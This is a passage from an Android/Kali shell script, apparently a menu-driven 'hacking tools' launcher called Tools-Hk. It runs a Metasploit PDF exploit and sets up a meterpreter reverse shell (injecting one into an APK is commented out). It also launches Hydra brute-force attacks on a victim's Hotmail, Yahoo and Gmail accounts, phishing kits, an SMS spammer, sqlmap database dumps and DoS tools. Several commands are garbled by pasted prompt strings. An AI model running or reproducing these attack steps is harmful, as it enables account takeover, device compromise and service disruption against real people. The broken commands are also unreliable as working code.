echo -e $green
read -p " insert : " lport
echo ""
msfconsole -x 'use exploit/android/fileformat/adobe_read -p " insert : "er_pdf_js_interface.rb' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit' 
cp $HOME/.msf4/local/msf.pdf /mnt/sdcard 
bash Tools-Hk.sh
fi
if [ $pa = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $injection_payload = 2 ]
then
clear
echo -e $green
cd $Home
figlet "Injecion apk "
cd Tmux-Bunch
./tmuxbunch
#echo ""
#echo -e $green "What is LHOST"
#echo -e $green
#read -p " insert : " lhost
#echo ""
#echo -e $green "What is LPORT"
#echo -e $green
#read -p " insert : " lport
#echo ""
#echo -e $green "path target apk ex : /sdcard/whatsapp.apk?"
#read -p " insert : " target
#msfvenom -x $target -p android/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -o $target


bash Tools-Hk.sh
fi
if [ $injection_payload = 3 ]
then
clear
echo -e $green
figlet "PAYMAX"
cd ~
cd PAYMAX
python2 paymax.py
bash Tools-Hk.sh
fi
if [ $injection_payload = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 2 ]
then
clear
head
echo -e $green   "Scan Ip"
echo ""
echo -e $green     '{ -1- } ===> ' $white " nmap"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Devploit"
echo ""
echo ""

echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " scanport
if [ $scanport = 1 ]
then
clear
figlet "scan nmap"
echo ""
echo -e $green "What is Ip web/device "
echo -e $green
read -p " insert : " ip
echo ""
toilet "Loading" 
nmap $ip
fi
if [ $scanport = 2 ]
then
clear
figlet "scan Devploit"
echo ""
echo ""
toilet "Loading" 
cd ~
cd Devploit
python2 Devploit
fi
if [ $scanport = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 3 ]
then
clear
head
echo -e $green   "Account Hack"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Crunch wordlist"
echo -e $green     '{ -2- } ===> ' $green " Hydra"
echo -e $green     '{ -3- } ===> ' $white " weeman"
echo -e $green     '{ -4- } ===> ' $green " socialfish"
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " accountHk
if [ $accountHk = 1 ]
then
clear
figlet "Creat wordlist"
echo ""
echo -e $green "what is the username ? "
echo -e $green
read -p " insert : " phone
echo -e $green "name list ex :pass.txt "
echo -e $green
read -p " insert : " namelist

echo -e $green " sum little first  + second = ? example : mohammed773532224 = fisrt + second 8+9 = 17 "
echo -e $green
echo ""
read -p " insert : " much
echo -e $green "please insert path save ex:/sdcard/"
echo -e $green
read -p " insert : " pathsave
echo ""
echo -e $green "insert your pass hack ex:first@@@@@"
echo -e $green
read -p " insert : " num
echo ""
toilet "Loading"
crunch $much $much $phone -t $num -o $pathsave$namelist

bash Tools-Hk.sh
fi
if [ $accountHk = 2 ]
then
clear
head
echo -e $green   "Hydra"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Hotmail"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Yahoo"
echo ""
echo -e $green     '{ -3- } ===> ' $white " Gmail"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
read -p " insert : " hydra
if [ $hydra = 1 ]
then
clear
figlet "Hotmail Hack"
echo -e $yellow "please insert vactime email .."
echo -e $green
read -p " insert : " hayd
echo -e $yellow "please insert path wordlist .."
echo -e $green
read -p " insert : " pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.live.com smtp
fi
if [ $hydra = 2 ]
then
clear
figlet "Yahoo Hack"
echo -e $yellow "please insert vactime email .."
echo -e $green
read -p " insert : " hayd
echo -e $yellow "please insert path wordlist ..."
echo -e $green
read -p " insert : " pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.mail.yahoo smtp
bash Tools-Hk.sh
fi
if [ $hydra = 3 ]
then
clear
figlet "Gmail Hack"
echo -e $yellow "please insert vactime email .."
echo -e $green
read -p " insert : " hayd
echo -e $yellow "please insert path wordlist..."
echo -e $green
read -p " insert : " pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 465 smtp.gmail.com smtp
bash Tools-Hk.sh
fi
if [ $hydra = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $accountHk = 3 ]
then
clear
figlet "weeman"
cd ~
cd Tools-Hk/weeman
python2 weeman.py
bash Tools-Hk.sh
fi
if [ $accountHk = 4 ]
then
clear
figlet "SocialFish"
cd ~
cd Tools-Hk/SocialFish
chmod +x SocialFish.py
pip install -r requirements.txt
pip2 install wget
python2 SocialFish.py
bash Tools-Hk.sh
fi
if [ $accountHk = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 4 ]
then
clear
echo -e $yellow "please insert how many second .."
read -p " insert : " delay
echo -e $yellow "please insert victime phone .."
read -p " insert : " phone
cd ~
cd Spammer-Grab
chmod +x spammer.py
echo "Installing..."
apt update &> /dev/null
apt install python2 -y &> /dev/null
apt install python2-pip -y &> /dev/null
pip2 install requests &> /dev/null
echo "Done"
python2 spammer.py --delay $delay $phone
bash Tools-Hk.sh
fi
if [ $usage = 5 ]
then
clear
head
echo -e $green   "web hack"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Sqlmap"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Scriptux(creat index)"
echo ""
echo -e $green     '{ -3- } ===> ' $white " sniper-h(list hash)"
echo ""
echo -e $green     '{ -4- } ===> ' $green " Hash Mix"
echo ""
echo -e $green     '{ -5- } ===> ' $white " hash-identifier"
echo ""
echo -e $green     '{ -6- } ===> ' $green " dirsearch"
echo ""
echo -e $green     "00- BACK"
echo ""
read -p " insert : " whk
if [ $whk = 1 ]
then
clear
echo -e $yellow "please insert web url"
read -p " insert : " wehk
cd ~
cd sqlmap
python sqlmap.py -u $read -p " insert : " --dbs
echo -e $yellow "please insert database"
read -p " insert : " datat
python sqlmap.py -u $read -p " insert : " --dbs
echo -e $yellow "please insert table"
read -p " insert : " table
python sqlmap.py -u $read -p " insert : " -D $data --tables
echo -e $yellow "please insert columns"
read -p " insert : " columns
python sqlmap.py -u $read -p " insert : " -D $data -T $tables columns
echo -e $yellow "please insert data columns"
read -p " insert : " dump
python sqlmap.py -u $read -p " insert : " -D $data -T $tables -C $columns --dump

echo -e $yellow "Do you want define type hash insert y/n "
read -p " insert : " typehash
if [ $typehash = "y" ]
then
clear
cd ~
cd hash-identifier.py
python2 hash-identifier.py

else
bash Tools-Hk.sh
fi
fi
if [ $whk = 2 ]
then
clear
figlet "Creat index "
cd ~
cd Tools-Hk/Scriptux
sudo su
python2 scriptux.py
bash Tools-Hk.sh
fi
if [ $whk = 3 ]
then
clear
figlet "sniper-h "
cd ~
cd Tools-Hl/sniper-h
echo -e $yellow "Do you have list Hash ? please insert y/n"
read -p " insert : " pathlist
if [ $pathlist = "y" ]
then
clear
figlet "sniper-h"
echo -e $yellow "please insert path list ex : /sdcard/wordlist.txt"
read -p " insert : " pa
python3 sniper-h.py -H $Hash -W $pa -T md5
bash Tools-Hk.sh
else
cd ~
cd sniper-h
python3 sniper-h.py -H $Hash -W wordlist.txt -T md5
bash Tools-Hk.sh
fi
fi
if [ $whk = 4 ]
then
clear
figlet "Hash Mix "
git clone https://github.com/Matrix07ksa/HashMix
cd ~
cd Tools-Hk/HashMix
chmod +x hashmix.py
python2 hashmix.py
fi
if [ $whk = 5 ]
then
clear
figlet "hash-identifier"
cd ~
cd hash-identifier.py
python2 hash-identifier.py
fi
if [ $whk = 6 ]
then
clear
figlet "dirsearch "
cd ~
cd dirsearch
echo -e $yellow "please insert url"
read -p " insert : " url
python3 dirsearch.py -u $url -e *
bash Tools-Hk.sh
fi
if [ $whk = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 6 ]
then
clear
head
echo -e $green      " DDos Attack"
echo ""
echo -e $green     '{ -1- } ===> ' $white " slowloris"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Hammer"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
read -p " insert : " Ddosattack
if [ $Ddosattack = 1 ]
then
clear
figlet "Slowloris "
cd ~
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python setup.py
figlet "Dos Attack"
echo -e $yellow "please insert url web"
read -p " insert : " url
python slowloris.py $url
fi
if [ $Ddosattack = 2 ]
then
clear
figlet "Hammer "
cd ~
cd hammer
echo -e $yellow "please insert ip web.."
read -p " insert : " ip
echo -e $yellow "please insert port defult :80"
read -p " insert : " port
echo -e $yellow "please insert speed defult :135"
read -p " insert : " speed
python3 hammer.py -s $ip -p $port -t $speed
bash Tools-Hk.sh
fi
if [ $Ddosattack = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 7 ]
then
clear
head
echo -e $green   "Scan port"
echo ""
echo -e $green     '{ -1- } ===> ' $white " nmap"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " scanport1
if [ $scanport1 = 1 ]
then
clear
figlet "scan nmap"
echo ""
echo -e $green "What is Ip  web/device "
echo -e $green
read -p " insert : " ip
echo ""
toilet "Loading" 
nmap -sV $ip
fi
if [ $scanport1 = 2 ]
then
clear
figlet "scan Devploit"
echo ""
echo ""
toilet "Loading" 
cd ~
cd Devploit
python2 Devploit
fi
if [ $scanport1 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 8 ]
then
clear
head
echo -e $green   "cread -p " insert : " word list"
echo ""
echo -e $green '{ -1- } ===> ' $white " creat (list password)"
echo ""
echo "" 
echo -e $green     "00- BACK"
read -p " insert : " start
if [ $start = 1 ]
then

figlet "Creat wordlist"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "insert count number .."
echo "" 
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " much

echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "what is the first: char or number ? ex: 0123456789 "
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

read -p " insert : " phone
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "name list ex :pass.txt "
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

read -p " insert : " namelist

toilet "Loading"

wordlist -m $much -M $much -o $namelist $phone


fi
if [ $start = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi

if [ $usage = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usetools = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $name = 4 ]
then
clear
head
echo -e $green   "TOOLS"
echo ""
echo -e $green '{ -1- } ===> ' $white " fix err kali linux"
echo ""
echo -e $green '{ -2- } ===> ' $green " fix err Termux & Gnuroot"
echo ""
echo ""
echo -e $green "00- back"
echo ""
read -p " insert : " repairing
if [ $repairing = 1 ]
then
clear
head
echo -e $green   "fix errors Kali Linux"
echo ""
echo ""
echo ""
echo -e $green   '{ -1- } ===> ' $white " Fix error apt (not install && not update)"
echo ""
echo -e $green   '{ -2- } ===> ' $green " Fix error pgp"
echo ""
echo -e $green   '{ -3- } ===> ' $white " Fix error --fix-broken install"
echo ""
echo -e $green   '{ -4- } ===> ' $green " Fix error postgresql"
echo ""
echo -e $green   '{ -5- } ===> ' $white " Fix error dpkg /var/lib/dpkg/lock"
echo ""
echo -e $green   '{ -6- } ===> ' $green " Fix error /var/lib/apt/archives/lock"
echo ""
echo -e $green   '{ -7- } ===> ' $white " Fix error connection data metasploit"
echo ""
echo -e $green   '{ -8- } ===> ' $green " refresh .."
echo ""
echo -e $green   "00- Back <==="
echo "" 
echo "" 
echo -e $green "Enter The Number:" 
echo -e $green
read -p " insert : " fix_kali
if [ $fix_kali = 1 ]
then 
clear
echo ""
echo -e $green "auto fix this err.."
echo -e $yellow '{ -1- } ===> ' $white " git clone http://github.com/profionaldhim/sources.list"
echo -e $yellow '{ -2- } ===> ' $green " cd sources.list"
echo -e $yellow '{ -3- } ===> ' $white " mv sources.list /"
echo -e $yellow '{ -4- } ===> ' $green " mv sources.list /"
echo -e $yellow '{ -5- } ===> ' $white " cd .."
echo -e $yellow '{ -6- } ===> ' $green " mv sources.list etc"
echo ""
echo ""
echo ""
echo -e $yellow " if you want fix this err the normal method:"
echo -e $yellow " cd .."
echo -e $yellow "cd etc"
echo -e $yellow "nano sources.list"
echo -e $yellow " clear all text in file"
echo -e $yellow "past: deb http://http.kali.org/kali kali-rolling main non-free contrib # For source package access,uncomment the following line # deb-src http://http.kali.org/kali kali-rolling main contrib non-free"
echo -e $yellow "ctrl + x "
echo -e $yellow "Y then enter "
echo -e $yellow "if you want auto fix this err please insert y then enter "
read -p " insert : " fixsurceslist
if [ $fixsources = "y" ]
then 

cp sources.list $PREFIX/etc/apt/
apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6
echo -e $green " success full"
bash Tools-Hk.sh
fi 
fi
if [ $fix_kali = 2 ]
then 
clear
echo ""
echo "" 
echo -e $green "to fix this err..."
echo -e $yellow '{ -1- } ===> ' $white "past this command apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6 "
echo -e $yellow '{ -2- } ===> ' $green " apt update && apt upgrade -y "
echo ""
echo ""
echo -e $yellow "if you want auto fix this err please insert y then enter "
read -p " insert : " fixpgp
if [ $fixpgp = "y" ]
then 
apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6
apt update && apt upgrade -y

echo -e $green "success ful"

bash Tools-Hk.sh
fi
fi 
if [ $fix_kali = 3 ]
then 
clear
echo ""
echo "" 
echo -e $yellow "if you want auto fix this err please insert y then enter "
read -p " insert : " fixbroken
if [ $fixbroken = "y" ]
then 
apt --fix-broken install
apt update && apt upgrade -y
echo -e $yellow "are the err finshed? "
fi
read -p " insert : " noproblem
if [ $noproblem = "n" ]
then 
clear
echo ""
echo "" 
fuser -v /var/cache/debconf/config.dat
rm /var/lib/apt/lists/* -vf
apt update && apt upgrade -y

fi  
bash Tools-Hk.sh
fi 
if [ $fix_kali = 4 ]
then 
clear
echo ""
echo "" 
echo -e $green "if this err no postgresql after that look the solution ok .."
echo -e $yellow "if you want auto fix this err please insert y then enter "
read -p " insert : " fix-postgresql
if [ $fix-postgresql = "y" ]
then 
apt install postgresql -y
service postgresql start
apt update && apt upgrade -y
echo -e $green " success full"
echo ""
echo "" 
bash Tools-Hk.sh
fi 
fi
if [ $fix_kali = 5 ]
then 
clear
echo -e $yellow "if this err dpkg /var/lib/dpkg/lock "
echo ""
echo "" 
echo -e $yellow "if you want auto fix this err please insert y then enter "
read -p " insert : " fixdpkgrm
if [ $fixdpkgrm = "y" ]
then 
rm /var/lib/dpkg/lock
echo -e $green " success full"

echo ""
echo "" 
fi 
bash Tools-Hk.sh
fi 
if [ $fix_kali = 6 ]
then 
clear
echo ""
echo "" 
echo -e $yellow "if this err dpkg /var/lib/apt/archives/lock "
echo ""
echo ""
echo -e $yellow "if you want auto fix this err please insert y then enter "
read -p " insert : " fixdpkgrm2
if [ $fixdpkgrm2 = "y" ]
then 
echo ""
echo "" 
rm /var/lib/apt/archives/lock
echo -e $green " success full"

fi 
bash Tools-Hk.sh
fi 
if [ $fix_kali = 7 ]
then 
clear
echo -e $yellow "if this err database not connected "
echo ""
echo "" 
echo -e $yellow "if you want auto fix this err please insert y then enter "
read -p " insert : " fix-connect
if [ $fix-connect = "y" ]
then 
clear
echo ""
echo "" 

fi 
bash Tools-Hk.sh
fi 
if [ $fix_kali = 8 ]
then 

echo ""
echo "" 
apt update && apt upgrade -y
bash Tools-Hk.sh
fi 
if [ $fix_kali = 00 ]
then 
clear
echo ""
echo "" 
bash Tools-Hk.sh
fi 
fi
if [ $repairing = 2 ]
then
clear
head
echo -e $green   "Repair Termux && Gnuroot"
echo ""
echo -e $green     '{ -1- } ===> ' $white " update && upgrade"
echo ""
echo -e $green     '{ -2- } ===> ' $green " repair source.list"
echo ""
echo -e $green     '{ -3- } ===> ' $white " install language programming"
echo ""
echo -e $green     '{ -4- } ===> ' $green " repair dpkg"
echo ""
echo -e $green     '{ -5- } ===> ' $white " repair error metasploit to connect database"
echo ""
echo -e $green     '{ -6- } ===> ' $green " repair Tmux-Bunch-arm"
echo ""
echo ""

echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " repair
if [ $repair = 1 ]
then
clear
figlet "update"
echo ""
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $repair = 2 ]
then
clear
figlet "repair source"
echo ""
echo -e $green "repair source.list for Termux-arm"
echo ""
cd $Home
apt update && apt upgrade -y

pkg install git -y
git clone http://github.com/profionaldhim/sources-list-termux
cd sources-list-termux
mv sources.list $PREFIX/etc/apt
cd $Home
rm -rif sources-list-termux
apt update && apt upgrade -y
fi
if [ $repair = 3 ]
then
clear
head
echo -e $green   "install L.Programming"
echo ""
echo -e $green     '{ -1- } ===> ' $white " install python"
echo ""
echo -e $green     '{ -2- } ===> ' $green " install python2"
echo ""
echo -e $green     '{ -3- } ===> ' $white " install python3"
echo ""
echo -e $green     '{ -4- } ===> ' $green " install python-pip & python2-pip"
echo ""
echo -e $green     '{ -5- } ===> ' $white " install ruby"
echo ""
echo -e $green     '{ -6- } ===> ' $green " install Php"
echo ""
echo -e $green     '{ -7- } ===> ' $white " install java"
echo ""
echo -e $green     '{ -8- } ===> ' $green " install perl"
echo ""
echo ""

echo -e $green     "00- BACK"
echo ""
read -p " insert : " language
if [ $language = 1 ]
then
clear
figlet "install py"
echo ""
apt-get install python -y
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 2 ]
then
clear
figlet "install py2"
echo ""
apt-get install python2 -y
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 3 ]
then
clear
figlet "install py3"
echo ""
apt-get install python3 -y
apt-get update -y
apt-get upgrade -y 
bash Tools-Hk.sh
fi
if [ $language = 4 ]
then
clear
figlet "install pip & pip2"
echo ""
apt-get install python-pip -y
apt-get install python2-pip -y
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 5 ]
then
clear
figlet "install ruby"
echo ""
apt-get install ruby
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 6 ]
then
clear
figlet "Php"
echo ""
apt-get install php
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 7 ]
then
clear
figlet "install java"
echo ""

echo "java 8 is Downloading & Extracting .......#"
cd $Home
git clone https://github.com/Hax4us/java
cd java
chmod +x installjava
bash installjava
cd $Home
mv java/openjdk/binjava $PREFIX/bin
cd java/openjdk/bin
chmod +x java
java
cd $Home
apt-get update -y
apt-get upgrade -y

#apt-get install dirmngr gnupg curl -y
#apt-key adv --keyserver pool.sks-keyservers.net --recv 9D6D488416B493F0
#apt update
#apt-get install openjdk-9-jdk-headless
#apt update && apt upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 8 ]
then
clear
figlet "install perl"
echo ""
apt install perl -y
bash Tools-Hk.sh
fi
if [ $language = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $repair = 4 ]
then
clear
figlet "repair dpkg"
bash Tools-Hk.sh
fi
if [ $repair = 5 ]
then
clear
figlet "repair metasploit"
mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql
pg_ctl -D $PREFIX/var/lib/postgresql start

bash Tools-Hk.sh
fi
if [ $repair = 6 ]
then
clear
figlet "repair Tmux-Bunch"
apt-get update -y
apt-get upgrade -y
cd $Home
git clone http://github.com/profipnaldhim/tm-bunch-info
cd tm-bunch-info
chmod +x T-Info.sh
bash T-Info.sh
fi
if [ $repair = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $repairing = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $name = 5 ]
then
clear
head
echo -e $green   "Encrypt / Decrypt The Tools"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Start Encrypt Your Tools"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Decrypt Your Tools"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
read -p " insert : " encrypt
if [ $encrypt = 1 ]
then
clear
head
echo -e $green   "Start Encrypt The Tools"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "insert path and name Your tool ex: Desktop/Tools-Hk/Tools-Hk.sh"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

read -p " insert : " frompath
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "insert path export or to export ex: Download/Tools-Hk.sh"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

read -p " insert : " topath
bash-obfuscate $frompath -o $topath


fi
if [ $encrypt = 2 ]
then
clear
head
echo -e $green   "Start Encrypt The Tools"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "insert path and name Your tool ex: Desktop/Tools-Hk/Tools-Hk.sh"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

read -p " insert : " frompath
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "insert path export or to export ex: Download/Tools-Hk.sh"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

read -p " insert : " tompath
bash-obfuscate $frompath -o $topath
bash Tools-Hk.sh
fi
if [ $encrypt = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi

if [ $name = 6 ]
then
clear
head
echo -e $green   "      Update Tools-Hk "
echo ""
rm -rif Tools-Hk.sh
hash -r && wget https://raw.githubusercontent.com/profionaldhim/Tools-Hk/master/Tools-Hk.sh
echo -e $green "00- Back"
echo ""
read -p " insert : " about
if [ $about = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi

if [ $name = "send-sms" ]
then
sms

fi
if [ $name = 0 ]
then
clear
echo ""
echo ""
figlet "GOOD BYE"
figlet -f circle "Exit"
echo -e $green "my channel on youtube"
echo -e $green "https://www.youtube.com/channel/UCn3bOntxwCxoOkFyJlW-kzA"

fi


